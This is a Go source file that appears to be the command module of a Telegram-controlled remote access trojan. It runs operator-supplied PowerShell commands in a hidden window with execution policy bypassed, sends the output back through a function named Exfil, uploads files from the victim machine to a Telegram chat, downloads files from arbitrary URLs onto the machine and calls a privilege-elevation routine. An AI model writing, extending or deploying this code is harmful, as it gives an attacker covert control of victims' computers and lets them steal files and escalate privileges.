package commands

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/whiterabb17/shaman/package/api"
	"github.com/whiterabb17/shaman/package/util"
)

const (
	fmtPing = "Pong!\nRequest took %s"
	fmtRoot = "Elevation failed: %s"
)

// Ping
func Ping() {
	back := time.Now()
	api.Exfil("!Pong")
	api.Exfil(fmt.Sprintf(fmtPing, time.Since(back)))
}

// Shell
func Shell(command string) {
	cmd := exec.Command("powershell", "-NoLogo", "-Ep", "Bypass", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	b, err := cmd.CombinedOutput()
	out := string(b)
	if err != nil {
		out = err.Error() + "\n" + out
	}
	if out == "" {
		out = "<success>"
	}
	api.Exfil("Result: " + out)
}

// UploadFile handles /file commands by checking for and uploading a file.
func UploadFile(file string) {
	fi, err := os.Stat(file)
	if os.IsNotExist(err) {
		api.Exfil("The specified file does not exist.")
	}
	if fi.IsDir() {
		api.Exfil("This command expects a file, not a directory.")

	}
	//	fbyte, _ := os.ReadFile(file)
	msg := tgbotapi.NewDocument(util.ChatID, tgbotapi.FilePath(file))
	msg.Caption = file
	msg.File.NeedsUpload()
	api.Bot.Send(msg)
	api.Exfil("File Sent")
}

// Download attempts do download a file and save it.
func Download(args string) {
	arr := strings.SplitN(args, " ", 2)
	url, fn := arr[0], arr[1]

	res, err := http.Get(url)
	if err != nil {
		api.Exfil("Error: " + err.Error())

	}
	defer res.Body.Close()

	file, err := os.Create(fn)
	if err != nil {
		api.Exfil("Error: " + err.Error())

	}
	defer file.Close()

	_, err = io.Copy(file, res.Body)
	if err != nil {
		api.Exfil("Error: " + err.Error())
	} else {
		api.Exfil(fmt.Sprintf("File saved as `%s`", strings.ReplaceAll(fn, "`", "\\`")))
	}

}

// Elevate
func Elevate() {
	err := util.ElevateLogic()
	api.Exfil(fmt.Sprintf(fmtRoot, err))
}
